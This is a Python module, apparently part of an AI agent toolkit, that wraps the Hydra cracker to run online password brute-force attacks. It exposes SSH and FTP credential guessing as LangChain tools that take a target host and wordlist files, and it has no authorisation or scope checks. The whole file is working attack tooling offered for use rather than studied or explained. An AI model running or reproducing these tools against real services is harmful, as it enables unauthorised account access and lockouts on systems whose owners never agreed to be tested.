"""Hydra Integration - Online Password Brute-Force"""

import logging
import subprocess
from typing import Dict

logger = logging.getLogger(__name__)


class HydraBruteForcer:
    def __init__(self, hydra_path: str = "hydra"):
        self.hydra_path = hydra_path

    def brute_force(
        self,
        target: str,
        service: str,
        username: str = None,
        username_file: str = None,
        password: str = None,
        password_file: str = None,
        port: int = None,
        threads: int = 16,
    ) -> Dict:
        """
        Brute-Force Angriff mit Hydra.

        Args:
            target: Ziel-IP oder Hostname
            service: ssh, ftp, http-post-form, etc.
            username: Einzelner Username oder username_file
            password: Einzelnes Passwort oder password_file
        """
        cmd = [self.hydra_path, "-t", str(threads)]

        # Username
        if username:
            cmd.extend(["-l", username])
        elif username_file:
            cmd.extend(["-L", username_file])

        # Password
        if password:
            cmd.extend(["-p", password])
        elif password_file:
            cmd.extend(["-P", password_file])

        # Port
        if port:
            cmd.extend(["-s", str(port)])

        # Output
        cmd.extend(["-o", "/tmp/hydra_output.txt", "-b", "json"])

        # Target und Service
        cmd.append(target)
        cmd.append(service)

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=3600
            )

            # Parse Results
            if "password found" in result.stdout.lower():
                return {
                    "success": True,
                    "credentials_found": True,
                    "output": result.stdout,
                }
            else:
                return {
                    "success": True,
                    "credentials_found": False,
                    "output": result.stdout,
                }
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}


from langchain_core.tools import tool


@tool
def hydra_ssh_brute(
    target: str, username_file: str, password_file: str
) -> str:
    """SSH Brute-Force mit Hydra"""
    hydra = HydraBruteForcer()
    result = hydra.brute_force(
        target, "ssh", username_file=username_file, password_file=password_file
    )
    return (
        "Credentials found!"
        if result.get("credentials_found")
        else "No credentials found"
    )


@tool
def hydra_ftp_brute(target: str, username: str, password_file: str) -> str:
    """FTP Brute-Force mit Hydra"""
    hydra = HydraBruteForcer()
    result = hydra.brute_force(
        target, "ftp", username=username, password_file=password_file
    )
    return (
        "Credentials found!"
        if result.get("credentials_found")
        else "No credentials found"
    )
